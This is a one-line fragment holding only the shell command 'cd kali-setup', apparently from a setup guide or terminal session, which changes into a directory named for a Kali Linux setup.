   cd kali-setup
